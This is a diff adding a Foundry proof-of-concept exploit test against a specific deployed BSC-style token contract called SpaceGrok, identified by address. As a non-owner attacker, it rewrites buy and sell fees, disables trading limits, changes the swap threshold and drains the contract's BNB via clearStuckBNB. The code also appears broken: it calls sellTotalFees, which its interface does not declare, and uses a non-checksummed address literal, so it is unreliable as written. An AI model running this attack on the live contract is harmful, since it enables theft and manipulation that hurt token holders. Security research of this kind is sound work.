@@ -1,0 +1,88 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.18;
+
+import "forge-std/Test.sol";
+
+// Minimal interface for the vulnerable functions
+interface ISpaceGrok {
+    function owner() external view returns (address);
+    function buyTotalFees() external view returns (uint256);
+    function limitsActive() external view returns (bool);
+    function removeLimits() external returns (bool);
+    function updateBuyFees(uint256 _marketingFee, uint256 _devFee) external;
+    function updateSellFees(uint256 _marketingFee, uint256 _devFee) external;
+    function clearStuckBNB() external;
+    function manualSwap(uint256 amount) external;
+    function updateSwapTokensAtAmount(uint256 newAmount) external returns (bool);
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function maxTx() external view returns (uint256);
+    function maxWallet() external view returns (uint256);
+}
+
+contract ExploitTest is Test {
+    address constant SPACE_GROK = 0x58718fd4567517d9a713a1f9f3de6cbf9404e59e;
+    ISpaceGrok target = ISpaceGrok(SPACE_GROK);
+
+    address attacker = address(0xBEEF);
+    address owner;
+
+    function setUp() public {
+        vm.label(SPACE_GROK, "SpaceGrok");
+        vm.label(attacker, "Attacker");
+        owner = target.owner();
+        vm.label(owner, "Owner");
+    }
+
+    function test_unprotectedFunctions() public {
+        // Verify attacker is not owner
+        assertFalse(attacker == owner, "Attacker should not be owner");
+
+        // Record initial state
+        uint256 initialBuyTotalFees = target.buyTotalFees();
+        bool initialLimitsActive = target.limitsActive();
+        uint256 initialMaxTx = target.maxTx();
+        uint256 initialMaxWallet = target.maxWallet();
+
+        // 1. Unprotected updateBuyFees – attacker can set fees
+        vm.startPrank(attacker);
+        target.updateBuyFees(5, 0); // max allowed by require
+        vm.stopPrank();
+        uint256 newBuyTotalFees = target.buyTotalFees();
+        assertEq(newBuyTotalFees, 5, "Buy fees should have changed to 5");
+        assertTrue(newBuyTotalFees != initialBuyTotalFees, "Fees changed from initial");
+
+        // 2. Unprotected removeLimits – attacker can turn off limits
+        vm.prank(attacker);
+        bool removed = target.removeLimits();
+        assertTrue(removed, "removeLimits should succeed");
+        assertFalse(target.limitsActive(), "limitsActive should be false");
+        require(initialLimitsActive, "Initial limits should be active for meaningful test");
+
+        // 3. Unprotected updateSwapTokensAtAmount
+        uint256 newAmount = (target.totalSupply() * 1) / 100000; // min allowed
+        vm.prank(attacker);
+        target.updateSwapTokensAtAmount(newAmount);
+        // no assertion of exact value, but call must succeed
+
+        // 4. Unprotected updateSellFees
+        vm.prank(attacker);
+        target.updateSellFees(5, 0);
+        assertEq(target.sellTotalFees(), 5, "Sell fees should have changed");
+
+        // 5. If contract has BNB balance, clearStuckBNB can drain it
+        // Fund contract with some BNB
+        deal(SPACE_GROK, 1 ether);
+        uint256 contractBalanceBefore = address(SPACE_GROK).balance;
+        assertEq(contractBalanceBefore, 1 ether, "Contract funded");
+        uint256 attackerBalanceBefore = address(attacker).balance;
+        vm.prank(attacker);
+        target.clearStuckBNB();
+        uint256 contractBalanceAfter = address(SPACE_GROK).balance;
+        uint256 attackerBalanceAfter = address(attacker).balance;
+        assertEq(contractBalanceAfter, 0, "Contract BNB drained");
+        assertEq(attackerBalanceAfter - attackerBalanceBefore, 1 ether, "Attacker received BNB");
+    }
+}
+```
